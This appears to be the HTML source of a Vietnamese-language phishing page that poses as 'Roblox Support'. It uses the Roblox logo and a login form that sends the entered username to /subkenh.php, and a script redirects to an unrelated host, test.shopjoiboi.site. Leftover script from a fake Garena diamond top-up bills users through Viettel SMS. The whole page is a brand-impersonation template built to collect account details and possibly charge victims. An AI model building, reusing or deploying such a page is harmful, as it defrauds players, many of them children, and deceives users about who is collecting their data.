
<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Roblox Support</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<script type='text/javascript'>
//<![CDATA[
function loadCSS(e, t, n) { "use strict"; var i = window.document.createElement("link"); var o = t || window.document.getElementsByTagName("script")[0]; i.rel = "stylesheet"; i.href = e; i.media = "only x"; o.parentNode.insertBefore(i, o); setTimeout(function () { i.media = n || "all" }) }
loadCSS("https://use.fontawesome.com/releases/v5.6.3/css/all.css");loadCSS("https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700|Roboto+Condensed:300,400,700");
//]]>
</script>
<style>

#ketquas{
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    -webkit-box-align: center;
    -webkit-align-items: center;
    -ms-flex-align: center;
    align-items: center;
}
.nhan img{
      background: #cfcfcf;
    width: 150px;
}
.guitn{
	    margin-bottom: 15px;
    color: #202325;
}
sms{

    text-align: center;
    margin: 18px 0;
    font-size: 24px;
    line-height: 32px;
    color: #d43831;

}
.navbar-default {
    background-color: #ffffff;
    border-color: #ececec;
    padding: 5px 0;
    border-bottom: 1px solid #ececec;
}
.navbar-default .navbar-nav>.active>a, .navbar-default .navbar-nav>.active>a:focus, .navbar-default .navbar-nav>.active>a:hover {
    color: #555;
    background-color: #ffffff;
}
.navbar {
    position: relative;
    min-height: 60px;
    margin-bottom: 20px;
}
.navbar-brand {
    float: left;
    height: 50px;
    padding: 10px 20%;
    font-size: 18px;
    line-height: 20px;
}
.form-control {
    display: block;
    width: 100%;
    height: 34px;
    padding: 6px 12px;
    font-size: 14px;
    line-height: 1.42857143;
    color: #555;
    background-color: #fff;
    background-image: none;
    border: 1px solid #b3b3b3;
    border-radius: 5px;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
    box-shadow: none;
    -webkit-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
    -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
    -webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
    transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
    transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
    transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
}
body {
    font-family: Roboto;
    font-size: 14px;
    line-height: 1.42857143;
    font-weight: inherit;
    color: #333;
    background-color: #fafafa;
}
.alert-danger {
    color: #a94442;
    background-color: #ffffff;
    border-color: #ebccd1;
}
[type="radio"]:checked,
[type="radio"]:not(:checked) {
    position: absolute;
    left: -9999px;
}
[type="radio"]:checked + label,
[type="radio"]:not(:checked) + label
{
    position: relative;
    padding-left: 28px;
    cursor: pointer;
    line-height: 20px;
    display: inline-block;
    color: #666;
}
[type="radio"]:checked + label:before,
[type="radio"]:not(:checked) + label:before {
    content: '';
    position: absolute;
    left: 0;
    top: 0;
    width: 18px;
    height: 18px;
    border: 1px solid #ddd;
    border-radius: 100%;
    background: #fff;
}
[type="radio"]:checked + label:after,
[type="radio"]:not(:checked) + label:after {
    content: '';
    width: 12px;
    height: 12px;
    background: #F87DA9;
    position: absolute;
    top: 4px;
    left: 4px;
    border-radius: 100%;
    -webkit-transition: all 0.2s ease;
    transition: all 0.2s ease;
}
[type="radio"]:not(:checked) + label:after {
    opacity: 0;
    -webkit-transform: scale(0);
    transform: scale(0);
}
[type="radio"]:checked + label:after {
    opacity: 1;
    -webkit-transform: scale(1);
    transform: scale(1);
}
.list-group-item {
    position: relative;
    display: block;
    padding: 10px 15px;
    margin-bottom: -1px;
    background-color: transparent;
    border: 1px solid #ddd;
}
[type="radio"]:checked + label:after, [type="radio"]:not(:checked) + label:after {
    content: '';
    width: 12px;
    height: 12px;
    background: #3a3b3d;
    position: absolute;
    top: 3px;
    left: 3px;
    border-radius: 100%;
    -webkit-transition: all 0.2s ease;
    transition: all 0.2s ease;
}
n{
    font-weight: 400;
    color: #f60;
}
f{
    font-weight: 500;
        color: #727272;
}
.list-group-item {
    border-left: none;
    border-right: none;
    display: flex;
    border-radius: 0;
}
.list-group-item:first-child {
    border-top-left-radius: 0;
    border-top-right-radius: 0;
}
.list-group {
    padding-left: 0;
    margin-bottom: 20px;
    color: #818181;
}
p {
    margin: 0 0 15px;
}
.navbar-brand {
    float: left;
    height: 50px;
    padding: 10px 35%;
    font-size: 18px;
    line-height: 20px;
}
@media only screen and (max-width: 600px) {
  .navbar-default .navbar-toggle {
    border-color: #ddd;
    display: none;
}
}
  </style>
</head>
<body>
<div class="navbar navbar-default navbar-fixed-top" role="navigation">
<div class="navbar-header">
<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a href="/" class="navbar-brand"><img src="https://logos-world.net/wp-content/uploads/2022/09/Roblox-New-Logo.png" style="width: 100px"></a>
</div>
<div class="collapse navbar-collapse navbar-ex1-collapse">
<ul class="nav navbar-nav pull-right">
<li><a href="#"><i style="padding: 0px 5px;" class="fas fa-user"></i>Đăng nhập</a></li>
<li><a href="#">Chăm sóc khách hàng</a></li>
</ul>
</div>
</div>
<div class="container">
<div class="row">
<div class="col-md-1">
</div>
<div class="col-md-10" style="border: 1px solid #ededed;text-align: left;padding: 30px 10px;">
<div class="col-sm-3"></div>
<div class="col-sm-6" style="text-align: center">
<img style="width: 40px;margin-bottom: 15px;border-radius: 100%;" src="/255152354_954786771792907_4201585182676995979_n.jpg"><br />
<center>
<form action="/subkenh.php" method="GET">
<div class="form-group">
<input type="text" placeholder="Vui lòng nhập Username Roblox" class="form-control" name="username" required>
</div>
<button type="submit" name="log_ff" style="background: #3a3b3d;color: #fff;border-color: #3a3b3d;height: 40px;font-weight: 500;" class="btn btn-default btn-block">ĐĂNG NHẬP</button>
</center>
</center></div>
<div class="col-sm-3"></div>
</div>
<div class="col-md-1">
</div>
</div>
</div>
<style>
.footer {
    position: fixed;
    left: 0;
    bottom: 0;
    padding: 10px 50px;
    border-top: 1px solid #e4e4e4;
    width: 100%;
    background-color: white;
    color: #575757;
    text-align: center;
}
</style>
<script>
		function login() {
			var username = document.getElementById("username").value;
			if (username) {
				window.location.href = "https://test.shopjoiboi.site/subkenh.php?username=" + username;
			}
		}
	</script>
<div class="footer">
Roblox - <a href="/">@2023</a></div>
<script>
    $('#garena input').on('change', function() {
   var id_garena = $('input[name=radio-group]:checked', '#garena').val(); 
   if(id_garena === '1'){
       var sokimcuong = '90';
       var giatien = '10 000 VND';
   }
   else if(id_garena === '2'){
       var sokimcuong = '180';
       var giatien = '20 000 VND';
   }
   else if(id_garena === '3'){
       var sokimcuong = '460';
       var giatien = '50 000 VND';
   }
   else if(id_garena === '4'){
       var sokimcuong = '930';
       var giatien = '100 000 VND';
   }
   else if(id_garena === '5'){
       var sokimcuong = '1900';
       var giatien = '200 000 VND';
   }
   else if(id_garena === '6'){
       var sokimcuong = '4750';
       var giatien = '500 000 VND';
   }
   $("#ketqua").html('<ul class="list-group"><h4>Thanh toán</h4><li class="list-group-item"><div  style="float: left;width: 50%;">Sản phẩm</div><div style="float: right;margin: auto;width: 50%;"><img src="/255152354_954786771792907_4201585182676995979_n.jpg" alt="" style="width: 20px;margin-right: 5px;"><span>Kim Cương × '+ sokimcuong +'</span></div></li><li class="list-group-item"><div  style="float: left;width: 50%;">Số tiền thanh toán</div><div style="float: right;margin: auto;width: 50%;"><span>'+ giatien +'</span></div></li><li class="list-group-item"><div  style="float: left;width: 50%;">Phương thức thanh toán</div><div style="float: right;margin: auto;width: 50%;"><span>Viettel SMS</span></div></li><li class="list-group-item"><div  style="float: left;width: 50%;">Người chơi</div><div style="float: right;margin: auto;width: 50%;"><span></span></div></li><button type="submit" id="log_ff" style="background: #3a3b3d;color: #fff;border-color: #3a3b3d;margin-top: 20px;height: 40px;font-weight: 500;" class="btn btn-default btn-block" onclick="xulythanhtoan('+ id_garena +')">XỬ LÝ THANH TOÁN</button></ul>');
});
    function xulythanhtoan(id_sms){
    	$("#log_ff").html("ĐANG XỬ LÝ...");
    	$('#ketqua').load('sms.php?PT=Garena&IDNAP=' + id_sms, function(data){
        });
    }
    if ( window.history.replaceState ) {
  window.history.replaceState( null, null, window.location.href );
}
</script>
</body>
</html>